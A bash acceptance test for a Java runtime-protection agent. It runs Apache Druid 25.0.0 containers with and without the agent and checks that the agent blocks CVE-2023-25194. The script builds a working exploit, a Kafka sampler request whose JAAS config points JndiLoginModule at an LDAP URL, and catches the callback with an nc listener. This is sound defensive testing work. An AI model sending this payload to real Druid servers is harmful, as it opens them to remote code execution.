#!/usr/bin/env bash
set -euo pipefail

image="${OHMYRASP_VULHUB_DRUID_25194_IMAGE:-vulhub/apache-druid:25.0.0}"
baseline_name="${OHMYRASP_VULHUB_DRUID_25194_BASELINE_NAME:-ohmyrasp-vulhub-druid25194-baseline}"
protected_name="${OHMYRASP_VULHUB_DRUID_25194_PROTECTED_NAME:-ohmyrasp-vulhub-druid25194-protected}"
baseline_port="${OHMYRASP_VULHUB_DRUID_25194_BASELINE_PORT:-18691}"
protected_port="${OHMYRASP_VULHUB_DRUID_25194_PROTECTED_PORT:-18692}"
baseline_ldap_port="${OHMYRASP_VULHUB_DRUID_25194_BASELINE_LDAP_PORT:-15094}"
protected_ldap_port="${OHMYRASP_VULHUB_DRUID_25194_PROTECTED_LDAP_PORT:-15095}"

script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd -- "${script_dir}/../.." && pwd)"
agent_root="${repo_root}/java-agent"
agent_jar="${agent_root}/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
work_dir="${OHMYRASP_VULHUB_DRUID_25194_WORK_DIR:-/tmp/ohmyrasp-druid25194}"
baseline_response="${work_dir}/baseline-response.txt"
protected_response="${work_dir}/protected-response.txt"
baseline_payload="${work_dir}/baseline-payload.json"
protected_payload="${work_dir}/protected-payload.json"
baseline_ldap_log="${work_dir}/baseline-ldap.txt"
protected_ldap_log="${work_dir}/protected-ldap.txt"
protected_home="${work_dir}/protected-home.html"
protected_logs="${work_dir}/protected-logs"
protected_log="${protected_logs}/events.jsonl"

cleanup() {
  docker rm -f "${baseline_name}" "${protected_name}" >/dev/null 2>&1 || true
}

trap cleanup EXIT

wait_for_http() {
  local port="$1"
  local name="$2"
  for attempt in $(seq 1 90); do
    local status
    status="$(curl -fsS -o /dev/null -w '%{http_code}' "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "${status}" == "200" || "${status}" == "302" ]]; then
      return 0
    fi
    sleep 2
  done
  echo "Druid ${name} did not become ready" >&2
  docker logs --tail 200 "${name}" >&2 || true
  return 1
}

read_home() {
  local port="$1"
  local response_file="$2"
  local status
  status="$(curl -sS -o "${response_file}" -w '%{http_code}' "http://127.0.0.1:${port}/")"
  if [[ "${status}" != "200" && "${status}" != "302" ]]; then
    echo "Druid home read failed on port ${port}; status=${status}" >&2
    cat "${response_file}" >&2 || true
    return 1
  fi
}

wait_for_sampler_route() {
  local port="$1"
  local name="$2"
  local probe_file="${work_dir}/${name}-sampler-route-probe.txt"
  for attempt in $(seq 1 90); do
    local status
    status="$(
      curl -sS \
        -o "${probe_file}" \
        -w '%{http_code}' \
        -H "Content-Type: application/json" \
        --data-binary '{}' \
        "http://127.0.0.1:${port}/druid/indexer/v1/sampler?for=connect" 2>/dev/null || true
    )"
    if [[ "${status}" != "000" ]] && ! grep -q "Unable to determine destination" "${probe_file}" 2>/dev/null; then
      return 0
    fi
    sleep 2
  done
  echo "Druid ${name} sampler route did not become ready" >&2
  cat "${probe_file}" >&2 || true
  docker logs --tail 200 "${name}" >&2 || true
  return 1
}

write_sampler_payload() {
  local ldap_url="$1"
  local output_file="$2"
  python3 - "${ldap_url}" >"${output_file}" <<'PY'
import json
import sys

ldap_url = sys.argv[1]
body = {
    "type": "kafka",
    "spec": {
        "type": "kafka",
        "ioConfig": {
            "type": "kafka",
            "consumerProperties": {
                "bootstrap.servers": "127.0.0.1:6666",
                "sasl.mechanism": "SCRAM-SHA-256",
                "security.protocol": "SASL_SSL",
                "sasl.jaas.config": (
                    "com.sun.security.auth.module.JndiLoginModule required "
                    f'user.provider.url="{ldap_url}" '
                    'useFirstPass="true" serviceName="x" debug="true" '
                    'group.provider.url="xxx";'
                ),
            },
            "topic": "test",
            "useEarliestOffset": True,
            "inputFormat": {
                "type": "regex",
                "pattern": r"([\s\S]*)",
                "listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965",
                "columns": ["raw"],
            },
        },
        "dataSchema": {
            "dataSource": "sample",
            "timestampSpec": {
                "column": "!!!_no_such_column_!!!",
                "missingValue": "1970-01-01T00:00:00Z",
            },
            "dimensionsSpec": {},
            "granularitySpec": {"rollup": False},
        },
        "tuningConfig": {"type": "kafka"},
    },
    "samplerConfig": {"numRows": 500, "timeoutMs": 15000},
}
print(json.dumps(body, separators=(",", ":")))
PY
}

send_sampler_with_listener() {
  local port="$1"
  local ldap_port="$2"
  local payload_file="$3"
  local response_file="$4"
  local listener_file="$5"
  local ldap_url="ldap://host.docker.internal:${ldap_port}/x"

  rm -f "${payload_file}" "${response_file}" "${listener_file}"
  write_sampler_payload "${ldap_url}" "${payload_file}"

  timeout 35 nc -lv -p "${ldap_port}" -w 10 >"${listener_file}" 2>&1 &
  local listener_pid="$!"
  sleep 1

  curl -sS \
    --max-time 45 \
    -o "${response_file}" \
    -w '%{http_code}' \
    -H "Content-Type: application/json" \
    --data-binary "@${payload_file}" \
    "http://127.0.0.1:${port}/druid/indexer/v1/sampler?for=connect" || true

  wait "${listener_pid}" || true
}

jaas_block_count() {
  grep -Ec '"algorithm":"java8_jaas_jndi_remote_provider".*"action":"block"' "${protected_log}" 2>/dev/null || true
}

docker run --rm \
  -v "${agent_root}:/workspace" \
  -w /workspace \
  gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "${work_dir}"
mkdir -p "${protected_logs}"
cleanup

docker run -d \
  --name "${baseline_name}" \
  --add-host=host.docker.internal:host-gateway \
  -p "${baseline_port}:8888" \
  "${image}" >/dev/null

docker run -d \
  --name "${protected_name}" \
  --add-host=host.docker.internal:host-gateway \
  -p "${protected_port}:8888" \
  -v "${agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "${protected_logs}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "${image}" >/dev/null

wait_for_http "${baseline_port}" "${baseline_name}"
wait_for_http "${protected_port}" "${protected_name}"
wait_for_sampler_route "${baseline_port}" "${baseline_name}"
wait_for_sampler_route "${protected_port}" "${protected_name}"

if ! grep -q '"jaas_hook":"installed"' "${protected_log}"; then
  echo "protected Druid Java8 agent did not report installed JAAS hook" >&2
  cat "${protected_log}" >&2 || true
  exit 1
fi

read_home "${protected_port}" "${protected_home}"

if grep -q '"event":"ohmyrasp-detection"' "${protected_log}"; then
  echo "protected Druid logged a detection before the sampler request" >&2
  cat "${protected_log}" >&2
  exit 1
fi

baseline_status="$(
  send_sampler_with_listener \
    "${baseline_port}" \
    "${baseline_ldap_port}" \
    "${baseline_payload}" \
    "${baseline_response}" \
    "${baseline_ldap_log}"
)"
if [[ "${baseline_status}" != "400" ]] || ! grep -q "Connection received" "${baseline_ldap_log}"; then
  echo "baseline Druid CVE-2023-25194 sampler did not reach attacker LDAP; status=${baseline_status}" >&2
  cat "${baseline_ldap_log}" >&2 || true
  cat "${baseline_response}" >&2 || true
  docker logs --tail 120 "${baseline_name}" >&2 || true
  exit 1
fi

before_count="$(jaas_block_count)"
protected_status="$(
  send_sampler_with_listener \
    "${protected_port}" \
    "${protected_ldap_port}" \
    "${protected_payload}" \
    "${protected_response}" \
    "${protected_ldap_log}"
)"
after_count="$(jaas_block_count)"

if [[ "${after_count}" -le "${before_count}" ]]; then
  echo "missing java8_jaas_jndi_remote_provider block event for Druid CVE-2023-25194; status=${protected_status}" >&2
  cat "${protected_log}" >&2 || true
  cat "${protected_response}" >&2 || true
  exit 1
fi

if grep -q "Connection received" "${protected_ldap_log}"; then
  echo "protected Druid CVE-2023-25194 reached attacker LDAP despite RASP; status=${protected_status}" >&2
  cat "${protected_ldap_log}" >&2 || true
  cat "${protected_log}" >&2 || true
  exit 1
fi

echo "vulhub Druid/Kafka CVE-2023-25194 Java8 acceptance passed"
